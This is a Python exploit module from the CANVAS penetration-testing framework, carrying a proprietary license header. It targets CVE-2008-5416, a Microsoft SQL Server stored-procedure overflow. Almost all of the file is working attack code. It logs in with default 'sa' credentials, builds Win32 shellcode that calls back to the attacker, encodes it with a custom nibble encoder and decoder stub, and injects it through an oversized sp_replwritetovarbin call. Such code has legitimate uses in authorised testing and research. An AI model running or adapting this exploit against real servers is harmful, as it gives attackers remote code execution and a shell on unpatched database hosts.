#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
import time

from exploitutils import *

from tcpexploit   import tcpexploit
import canvasengine

import libs.mssql as mssql

from sqllistener import mssqllistener
from SQLNode import SQLNode
from SQLShellServer import mssqlshellserver


from shelllistener import *
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell


NAME="replwritetovarbin stored procedure overflow."
DESCRIPTION="replwritetovarbin stored procedure overflow."

DOCUMENTATION = {}
DOCUMENTATION['VENDOR']       = "Microsoft"
DOCUMENTATION["Date public"]  = "12-09-2008"
DOCUMENTATION["CERT Advisory"]= "http://www.kb.cert.org/vuls/id/696644"
DOCUMENTATION["Repeatability"]= "One-shot"
DOCUMENTATION["References"]   = "http://www.sec-consult.com/files/20081209_mssql-sp_replwritetovarbin_memwrite.txt"
DOCUMENTATION["CVE Name"]     = "CVE-2008-5416"
DOCUMENTATION["CVE Url"]      = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5416"
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION["Notes"]        = "Exploit only works against non-DEP enabled targets."

PROPERTY={}
PROPERTY['TYPE']   = "Exploit"
PROPERTY['SITE']   = "Remote"
PROPERTY['ARCH']   = [ ["Windows" ] ]
PROPERTY['VERSION']= ["2003"]
PROPERTY['MSADV']  = "MS09-004"


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name     = NAME
        self.host     = None
        self.port     = 1433
        self.user     = "sa"
        self.password = ""
        self.node     = None
        self.shell    = None
        self.shellcode= ""
        self.badstring= "\x00\x0a\x0d\x27\x22\x7f"
        
        return

    def createShellcode(self):

        rawshellcode = self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        
        # Special unicode encoder see utorrent exploit
        while (len(rawshellcode)%4)!=0:
            rawshellcode+='A'
        SIZE=len(rawshellcode)/4
        if SIZE>0xffff: #should be enough?
            raise Exception,'Shellcode too long! (size: %d)' % (SIZE*4) 

        while ( (SIZE & 0xFF) >=0x80) and ( (SIZE & 0xFF) <=0x9f): #increase SIZE if within the badchars range
            rawshellcode+='BBBB'
            SIZE+=1
        #the encoding scheme is pretty self explanatory
        encodedshellcode=''
        for i in range(0,len(rawshellcode),4):
            L=struct.unpack('<L',rawshellcode[i:i+4])[0]
            HIGH=((L&0xf0f0f0f0)>>4)+0x40404040
            LOW=(L&0x0f0f0f0f)+0x40404040
            encodedshellcode+=struct.pack('<LL',HIGH,LOW)
        decoder=''
        decoder+='\xd9\xee'             # 0: fldz
        decoder+='\xd9\x74\x24\xf4'     # 2: fnstenv 0xfffffff4(%esp)
        decoder+='\x5e'                 # 6: pop %esi
        decoder+='\x6a\x28'             # 7: push $0x28
        decoder+='\x59'                 # 9: pop %ecx
        decoder+='\x03\xf1'             # a: add %ecx,%esi
        decoder+='\x56'                 # c: push %esi
        decoder+='\x5f'                 # d: pop %edi
        if SIZE < 0xff:
            decoder+='\xb1'+chr(SIZE)       # e: mov $SIZE,%cl
        else:
            decoder+='\x66\xB9' + chr( SIZE  & 0xFF ) + chr( (SIZE >>8) & 0xFF) # mov $SIZE, cx
        decoder+='\xad'                 #10: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #11: sub $0x40404040,%eax
        decoder+='\xc1\xe0\x04'         #16: shl $0x4,%eax
        decoder+='\x50'                 #19: push %eax
        decoder+='\x5a'                 #1a: pop %edx
        decoder+='\xad'                 #1b: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #1c: sub $0x40404040,%eax
        decoder+='\x03\xc2'             #21: add %edx,%eax
        decoder+='\xab'                 #23: stos %eax,%es:(%edi)
        decoder+='\xe2\xea'             #24: loop 0x10
        decoder = decoder + "A" * ( len(decoder) % 4 )
        #decoder+='\x41'                 #26: inc %ecx
        #decoder+='\x41'                 #27: inc %ecx
        self.shellcode=decoder+encodedshellcode
        self.log('Total shellcode length=%d'%(len(self.shellcode)))
        
        if len(self.shellcode):
            return 1

        return -1
    
    def getargs(self):
        self.host      = self.target.interface
        self.port      = int(self.argsDict.get("port",self.port))
        self.user      = self.argsDict.get("user",self.user)
        self.password  = self.argsDict.get("password",self.password)
        return 
    
    def connect_to_mssql( self ):
        self.socknode = self.argsDict["passednodes"][0]
        error         = ""

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME,self.host, self.port), showlog=1)
        
        try:
            self.m = mssql.MSSQL(self.host, self.port)
            result = self.m.login(self.user, self.password)
            
            if(result == None):
                self.log("Error receiving packet")
                return 0

        except mssql.MSSQLError, msg:
            self.log("Failed: %s" % str(msg))
            self.setInfo("%s attacking %s:%d (failed)" % (NAME,self.host, self.port), showlog=1)            
            return 0
        
        self.setInfo("%s attacking %s:%d (success)" % (NAME,self.host, self.port), showlog=1)            
        node            = SQLNode()
        node.parentnode = self.socknode
        shell           = mssqlshellserver(self.m, node, logfunction=self.logfunction)
                
        shell.startup()
        node.startup()
        
        self.shell = shell
        self.node  = node

        return 1
    
    def send_stored_procedure( self ):
        
        
        stored_proc = """sql DECLARE @buf NVARCHAR(4000),
@val NVARCHAR(4),
@counter INT

SET @buf = '
declare @retcode int,
@end_offset int,
@vb_buffer varbinary,
@vb_bufferlen int,
@buf nvarchar;
exec master.dbo.sp_replwritetovarbin 1,
@end_offset output,
@vb_buffer output,
@vb_bufferlen output,'''

SET @val = '\x41'

SET @counter = 0
WHILE @counter < 64
BEGIN
SET @counter = @counter + 1
SET @buf = @buf + @val
END

SET @buf = @buf + '\x02\x53\xe9\x01'

SET @buf = @buf + '\x43\x43'

SET @buf = @buf + '$SHELLCODEREPLACEME'
"""        
        # Swap out the shellcode
        stored_proc      = stored_proc.replace("$SHELLCODEREPLACEME",self.shellcode)        
        shellcode_length = len(self.shellcode)
        
        if shellcode_length > 470:
            stored_proc += """
SET @buf = @buf + ''',''1'',''1'',''1'',
''1'',''1'',''1'',''1'',''1'',''1'''

EXEC master..sp_executesql @buf
        """
        else:
            length_diff = 470 - shellcode_length
            stored_proc += """
                        
SET @counter = 0
WHILE @counter < $SHELLCOUNTER
BEGIN
SET @counter = @counter + 1
SET @buf = @buf + @val
END

SET @buf = @buf + ''',''1'',''1'',''1'',
''1'',''1'',''1'',''1'',''1'',''1'''

EXEC master..sp_executesql @buf
"""
        
            stored_proc = stored_proc.replace("$SHELLCOUNTER", str(length_diff))
        
        self.log(self.shellcode.encode("HEX"))
        
        ret         = self.shell.sql_command( stored_proc )
        return 1
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def run(self):
        """
        This run happens on all nodes selected
        """
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()
        
        # Authenticate to the server
        ret = self.connect_to_mssql()
        
        if ret == 1:
            
            # Now let's send the attack
            ret = self.createShellcode()
            
            if ret != -1:
                self.send_stored_procedure()
            else:
                self.log("Failed to obtain shellcode!")
                self.setInfo("%s - failed." % NAME )                             
                
        return 0

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret:
        ret.interact()
